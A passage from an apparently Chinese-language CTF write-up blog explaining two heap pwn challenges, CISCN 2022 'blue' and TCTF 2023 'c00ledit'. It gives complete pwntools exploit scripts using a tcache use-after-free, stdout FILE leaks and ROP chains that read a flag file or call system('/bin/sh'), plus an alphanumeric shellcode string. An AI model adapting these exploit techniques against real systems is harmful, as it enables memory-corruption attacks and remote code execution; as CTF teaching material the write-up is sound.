class="comment"># print(rop.dump())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sla(b&#x27;Please enter how many bits you want to read\n&#x27;,b&#x27;-1&#x27;)</span></span><br><span class="line"><span class="comment"># pal=b&#x27;a&#x27;*0x28 + rop.chain()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sa(&#x27;Please enter what you want to read:\n&#x27;,pal)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s(b&#x27;/flag\x00&#x27;)</span></span><br></pre></td></tr></table></figure><p>第二种我是第一次见这种用法，非常简便，学到了，要求libc.address为libc_base不然会报错</p><h1 id="CISCN-2022-华东北-blue"><a href="#CISCN-2022-华东北-blue" class="headerlink" title="[CISCN 2022 华东北]blue"></a>[CISCN 2022 华东北]blue</h1><p>这题着实是让我受益很多（也恶心到了我</p><p>ORW</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>首先题目是都是tcache块，最大只能申请0x90(0xa0)的堆块，有一次的uaf，一次的show，和add，delete的功能</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先是通过申请9个0x80的堆块，然后填满tcache，之后给一个uaf就能到unsortedbin里，然后show就泄露了libc基址，之后要打ORW的一个思路便是申请到栈上，而这就少不了泄露栈地址和一个任意地址写，所以首先回到上面，add了9个堆块，再申请一个隔离块，之后uaf掉第九个堆块，delete掉第八个堆块，就能将unsortedbin和tcachebin实现overlapping，然后再申请一个0x70的堆块，再申请一个0x80的堆块，同时将这个0x80放到tcache中，就能将uaf的第8个堆块和这个0x80堆块overlapping，之后便是通过stdout来泄露environ，然后打到add上ret打orw</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28282</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">num=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>,tbs(num))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;Choice: &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: \n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">idx=<span class="built_in">int</span></span>):   <span class="comment">#just one</span></span><br><span class="line">    choice(<span class="number">666</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Please input idx: \n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,pal)</span><br><span class="line">add(<span class="number">0x80</span>,pal)  <span class="comment">#9隔离块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">uaf(<span class="number">8</span>)   <span class="comment">#8</span></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">2018272</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;stdout&#x27;</span>,stdout)</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;environ&#x27;</span>,environ)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x80</span>,pal)  <span class="comment">#0 腾一个tcache bin</span></span><br><span class="line">delete(<span class="number">8</span>)         <span class="comment">#放入tcache bin</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)   <span class="comment">#1</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pal=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(stdout)</span><br><span class="line">add(<span class="number">0x70</span>,pal)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)   <span class="comment">#3</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pal2 = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(environ) + p64(environ + <span class="number">8</span>) * <span class="number">2</span>  <span class="comment">#fbad1800恰好使check通过</span></span><br><span class="line">add(<span class="number">0x80</span>,pal2)   <span class="comment">#4</span></span><br><span class="line">stack_addr=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x128</span>  <span class="comment">#add的ret-8</span></span><br><span class="line">leak(<span class="string">&quot;stack_addr&quot;</span>,stack_addr)</span><br><span class="line"><span class="built_in">print</span>(stack_addr)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p3 = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(stack_addr)</span><br><span class="line">add(<span class="number">0x70</span>, p3)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;dddd&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#pop_rdi_ret = libc_base + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line"><span class="comment">#pop_rsi_ret = libc_base + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()</span></span><br><span class="line">pop_rsi_ret = libc_base +<span class="number">0x000000000002601f</span></span><br><span class="line"><span class="comment">#pop_rdx_ret = libc_base + libc.search(asm(&#x27;pop rdx;ret;&#x27;)).__next__()</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line"></span><br><span class="line">flag_addr = stack_addr</span><br><span class="line">ppp = stack_addr + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">p4 = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># open(&#x27;./flag&#x27;, 0)</span></span><br><span class="line">p4 += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line"><span class="comment"># read(3, ppp, 0x50)</span></span><br><span class="line">p4 += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(ppp) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line"><span class="comment"># puts(ppp)</span></span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p4 += p64(pop_rdi_ret) + p64(ppp) + p64(puts_addr)</span><br><span class="line">add(<span class="number">0x80</span>,p4)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>不过有个恶心的点，不知道为什么如果我的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: \n&#x27;</span>, <span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><p>这部分如果将str改为str().encode会导致之后的puts无法正常输出，挺奇怪的。。。。。</p><h1 id="2023tctf-c00ledit"><a href="#2023tctf-c00ledit" class="headerlink" title="2023tctf-c00ledit"></a>2023tctf-c00ledit</h1><p>本题主要是负数溢出</p><h3 id="静态分析-3"><a href="#静态分析-3" class="headerlink" title="静态分析"></a>静态分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( similar_read() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add((__int64)a1, (__int64)a2, v3, v4);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        a1 = <span class="string">&quot;Not implemented!&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Not implemented!&quot;</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **))edit)(a1, a2);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序只提供了两个功能，一个add和一个edit，add主要malloc一个0x10，前0x8存大小，后0x8存下一个malloc(0x1000)的地址，而主要的漏洞点在edit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="string">&quot;No chance!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v0 = <span class="string">&quot;Invalid index!&quot;</span>;</span><br><span class="line">  v1 = similar_read();</span><br><span class="line">  <span class="keyword">if</span> ( !heap_addr[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Offset: &quot;</span>);</span><br><span class="line">  v2 = similar_read();</span><br><span class="line">  <span class="keyword">if</span> ( v2 + <span class="number">7</span> &gt;= *(_QWORD *)heap_addr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">&quot;Invalid offset!&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  result = read(<span class="number">0</span>, (<span class="type">void</span> *)(*(_QWORD *)(heap_addr[v1] + <span class="number">8LL</span>) + v2), <span class="number">8uLL</span>);<span class="comment">// 有一个往上的溢出</span></span><br><span class="line">  ++num;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现两个涉及数组的地方均有负数溢出，第一个heap的负数可以涉到</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258834.png" alt="image-20240618171820924"></p><p>stdout，因此可以考虑通过stdout来泄露libc基址，会发现在<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258835.png" alt="image-20240618171953942"></p><p>在IO_FILE中如果不修改他的三个write指针指向的都是本结构体的高位地址，因此可以覆写低位来泄露结构体的地址，而偏移固然是不变的，就可以泄露libc基址了，然后再泄露environ来打stack rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28282</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,offset,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">b&#x27;Offset: &#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">    sa(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">131</span>,p64(<span class="number">0Xfbad1800</span>))</span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">91</span>,<span class="string">b&#x27;\x30&#x27;</span>)</span><br><span class="line">libc.address=u64((ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">2210416</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc.address)</span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">91</span>,p64(libc.sym[<span class="string">&#x27;_environ&#x27;</span>]+<span class="number">8</span>))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recv(0x9f0+13)</span></span><br><span class="line">p.recv(<span class="number">0xa03</span>)</span><br><span class="line">stack=u64((ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">main_ret=stack-<span class="number">0x120</span></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,-<span class="number">24</span>,p64(main_ret))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">24</span>,p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">16</span>,p64(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)).__next__()+<span class="number">1</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,p64(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)).__next__()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span 